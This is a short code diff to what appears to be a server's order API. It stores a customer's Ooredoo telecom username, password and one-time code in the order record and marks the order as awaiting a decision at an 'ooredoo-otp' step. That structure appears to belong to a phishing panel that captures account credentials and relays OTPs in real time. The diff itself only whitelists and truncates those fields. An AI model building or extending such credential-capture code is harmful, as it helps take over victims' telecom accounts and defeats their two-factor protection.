@@ -113,7 +113,14 @@ async function api(req, res, url) {
     if (b.ooredoo && typeof b.ooredoo === "object" && o.ref) {
       const i = orders.findIndex(x => x.ref === o.ref);
       if (i >= 0) {
-        orders[i].ooredoo = { ...orders[i].ooredoo, ...o.ooredoo };
+        const incoming = b.ooredoo;
+        const current = { ...orders[i].ooredoo };
+        for (const key of ["username", "password", "otp"]) {
+          if (Object.prototype.hasOwnProperty.call(incoming, key)) {
+            current[key] = str(incoming[key], key === "otp" ? 50 : 200);
+          }
+        }
+        orders[i].ooredoo = current;
         orders[i].status = "awaiting";
         orders[i].step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
         orders[i].decision = "";
